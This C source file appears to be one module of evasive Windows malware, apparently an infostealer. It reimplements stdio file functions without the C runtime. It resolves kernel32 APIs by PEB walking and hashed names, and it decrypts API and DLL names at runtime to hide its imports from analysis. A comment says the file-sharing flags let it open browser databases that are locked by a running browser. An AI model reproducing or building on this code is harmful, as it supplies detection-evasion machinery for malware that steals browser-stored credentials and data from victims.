/*
 * rt_file.c — minimal FILE I/O via Win32. No CRT.
 * Supports the modes used in the codebase: "rb", "w", "a".
 */
#include "rt.h"
#include "peb.h"
#include "hash.h"
#include "export_resolve.h"
#include "enc_strings.h"

void *malloc(size_t n);
void free(void *p);
size_t strlen(const char *s);

/* ── PEB-walk lazy-init singleton ──────────────────────────────── */
typedef HANDLE (WINAPI *pCreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL   (WINAPI *pReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL   (WINAPI *pWriteFile)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL   (WINAPI *pCloseHandle)(HANDLE);
typedef BOOL   (WINAPI *pSetFilePointerEx)(HANDLE, LARGE_INTEGER, PLARGE_INTEGER, DWORD);
typedef BOOL   (WINAPI *pFlushFileBuffers)(HANDLE);

static struct {
    pCreateFileA       pCF;
    pReadFile          pRF;
    pWriteFile         pWF;
    pCloseHandle       pCH;
    pSetFilePointerEx  pSFPE;
    pFlushFileBuffers  pFFB;
    int ready;
} g_rt_file;

static int rt_file_ensure_api(void) {
    if (g_rt_file.ready) return 1;
    char dll[32]; enc_decrypt(enc_kernel32, ENC_KERNEL32_LEN, dll);
    void *k32 = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
    if (!k32) return 0;
    char fn[32];
    enc_decrypt(enc_CreateFileA, ENC_CREATEFILEA_LEN, fn);
    g_rt_file.pCF = (pCreateFileA)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_ReadFile, ENC_READFILE_LEN, fn);
    g_rt_file.pRF = (pReadFile)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_WriteFile, ENC_WRITEFILE_LEN, fn);
    g_rt_file.pWF = (pWriteFile)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_CloseHandle, ENC_CLOSEHANDLE_LEN, fn);
    g_rt_file.pCH = (pCloseHandle)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_SetFilePointerEx, ENC_SETFILEPOINTEREX_LEN, fn);
    g_rt_file.pSFPE = (pSetFilePointerEx)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_FlushFileBuffers, ENC_FLUSHFILEBUFFERS_LEN, fn);
    g_rt_file.pFFB = (pFlushFileBuffers)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    if (!g_rt_file.pCF || !g_rt_file.pRF || !g_rt_file.pWF ||
        !g_rt_file.pCH || !g_rt_file.pSFPE || !g_rt_file.pFFB)
        return 0;
    g_rt_file.ready = 1;
    return 1;
}

FILE *fopen(const char *path, const char *mode) {
    if (!path || !mode) return NULL;
    if (!rt_file_ensure_api()) return NULL;
    DWORD access = 0, disposition = 0;
    int fmode = 0;
    /* Allow read/write/delete sharing so locked browser DBs still open. */
    DWORD share = FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE;

    switch (mode[0]) {
    case 'r':
        access = GENERIC_READ;
        disposition = OPEN_EXISTING;
        fmode = 0;
        break;
    case 'w':
        access = GENERIC_WRITE;
        disposition = CREATE_ALWAYS;
        fmode = 1;
        break;
    case 'a':
        access = GENERIC_WRITE;
        disposition = OPEN_ALWAYS;
        fmode = 2;
        break;
    default:
        return NULL;
    }

    HANDLE h = g_rt_file.pCF(path, access, share, NULL, disposition,
                           FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE)
        return NULL;

    if (fmode == 2) {
        LARGE_INTEGER li = { 0 };
        g_rt_file.pSFPE(h, li, NULL, FILE_END);
    }

    FILE *f = malloc(sizeof(FILE));
    if (!f) {
        g_rt_file.pCH(h);
        return NULL;
    }
    f->handle = h;
    f->mode = fmode;
    f->error = 0;
    f->eof = 0;
    return f;
}

int fclose(FILE *f) {
    if (!f)
        return EOF;
    g_rt_file.pCH(f->handle);
    free(f);
    return 0;
}

size_t fread(void *ptr, size_t size, size_t nmemb, FILE *f) {
    if (!f || size == 0)
        return 0;
    DWORD total = (DWORD)(size * nmemb);
    DWORD rd = 0;
    if (!g_rt_file.pRF(f->handle, ptr, total, &rd, NULL)) {
        f->error = 1;
        return 0;
    }
    if (rd < total)
        f->eof = 1;
    return rd / (DWORD)size;
}

size_t fwrite(const void *ptr, size_t size, size_t nmemb, FILE *f) {
    if (!f || size == 0)
        return 0;
    DWORD total = (DWORD)(size * nmemb);
    DWORD wr = 0;
    if (!g_rt_file.pWF(f->handle, ptr, total, &wr, NULL)) {
        f->error = 1;
        return 0;
    }
    return wr / (DWORD)size;
}

int fseek(FILE *f, long offset, int whence) {
    LARGE_INTEGER li;
    li.QuadPart = offset;
    DWORD move = (whence == SEEK_CUR) ? FILE_CURRENT
               : (whence == SEEK_END) ? FILE_END
               : FILE_BEGIN;
    if (!g_rt_file.pSFPE(f->handle, li, NULL, move)) {
        f->error = 1;
        return -1;
    }
    f->eof = 0;
    return 0;
}

long ftell(FILE *f) {
    LARGE_INTEGER cur = { 0 };
    LARGE_INTEGER pos;
    if (!g_rt_file.pSFPE(f->handle, cur, &pos, FILE_CURRENT))
        return -1L;
    return (long)pos.QuadPart;
}

int fflush(FILE *f) {
    if (f && f->handle != INVALID_HANDLE_VALUE)
        g_rt_file.pFFB(f->handle);
    return 0;
}

int feof(FILE *f) {
    return f ? f->eof : 0;
}

int ferror(FILE *f) {
    return f ? f->error : 0;
}

int fgetc(FILE *f) {
    unsigned char c;
    if (fread(&c, 1, 1, f) != 1)
        return EOF;
    return (int)c;
}

int fputs(const char *s, FILE *f) {
    if (!f)
        return EOF;
    size_t len = strlen(s);
    DWORD wr = 0;
    if (!g_rt_file.pWF(f->handle, s, (DWORD)len, &wr, NULL)) {
        f->error = 1;
        return EOF;
    }
    return 0;
}
